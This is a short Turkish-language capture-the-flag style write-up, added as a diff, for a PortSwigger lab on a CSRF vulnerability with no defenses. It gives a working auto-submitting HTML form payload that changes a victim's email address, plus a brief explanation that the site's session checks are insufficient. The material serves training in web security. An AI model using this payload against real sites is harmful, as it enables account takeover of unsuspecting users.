@@ -1,0 +1,21 @@
+Lab: CSRF vulnerability with no defenses
+url: https://portswigger.net/web-security/csrf/lab-no-defenses
+
+
+analiz : email değiştirilirken sadece bir post isteğiyle mail değişikliği yapılabildiğini fark ettik
+
+payload:
+
+
+<form method="POST" action="https://0a3b004d03bef6dc80b60324000a009b.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="hacked_by@harbinger">
+    <input type="submit" value="Submit request">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+açıklama: 
+
+kullanıcı bu isteği yaptığı anda site yüklenirse eğer mail adresi güncellenmiş olacak. bunun sebebi ise yeterli seviyede kimlik takibi 
+yapılmaması.
